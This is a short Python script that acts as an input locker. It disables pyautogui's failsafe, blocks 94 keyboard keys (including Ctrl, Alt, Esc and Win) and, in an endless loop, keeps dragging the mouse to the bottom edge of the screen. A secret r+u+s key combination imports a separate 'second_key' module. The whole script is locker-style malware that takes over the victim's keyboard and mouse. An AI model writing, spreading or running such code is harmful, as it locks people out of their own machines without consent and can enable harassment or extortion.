import pyautogui
import keyboard
import random as rnd
import sys
from time import monotonic
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0 

def mainBlock():

      
    AllMainLibrary =[ ',','.','/','|',':','"','[',']','-','0', '1','2','3', '4', '5', '6', '7', '8', '9',  'a', 'b', 'c', 'd',
    'e','f','g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','~', 'add', 'alt',
    'apps', 'backspace','capslock', 'clear',  'ctrl', 'decimal', 'del', 'delete',  'down', 'end', 'enter', 'esc', 'escape', 'execute',
    'f1', 'f10', 'f11','f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20', 'f21','f22', 'f23', 'f24', 'f3','f4',
    'f5', 'f6', 'f7','f8', 'f9', 'help', 'home', 'insert', 'left','numlock', 'pagedown', 'pageup', 'pause','pgup', 'print', 
    'return', 'right','select', 'separator', 'shift', 'sleep', 'space',  'subtract','tab', 'up','win','command', 'option']

    width, height = pyautogui.size()  

    def Block1():
        Time = monotonic()  
        while True:
                    if monotonic() - Time < 60: 
                     if (
                        keyboard.is_pressed('r') and keyboard.is_pressed('u') and keyboard.is_pressed('s')):
                        import second_key
                    
                    else:
                            pyautogui.moveTo(
                            rnd.randrange(800, 1400), rnd.randrange(1079, 1080)   
                            )
                    for i in range(94):
                            keyboard.block_key(AllMainLibrary[i]) 
                    else:
                     for i in range(94):
                        keyboard.block_key(AllMainLibrary[i])
                        pyautogui.moveTo(
                            rnd.randrange(800, 1400), rnd.randrange(1079, 1080)
                        )
    Block1()
mainBlock()